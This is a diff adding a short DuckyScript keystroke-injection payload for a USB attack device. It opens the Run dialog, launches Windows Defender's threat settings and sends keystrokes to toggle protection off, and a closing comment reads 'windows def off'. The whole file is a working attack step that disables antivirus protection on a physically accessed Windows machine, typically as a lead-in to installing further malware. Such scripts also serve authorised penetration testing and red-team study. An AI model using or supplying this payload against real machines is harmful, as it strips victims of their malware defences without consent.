@@ -1,0 +1,17 @@
+DELAY 1000
+WINDOWS r
+DELAY 500
+REM opens Windows Defender settings
+STRING  windowsdefender://threatsettings
+ENTER
+
+DELAY 4500
+SPACE
+DELAY 500
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 300
+
+REM windows def off
+
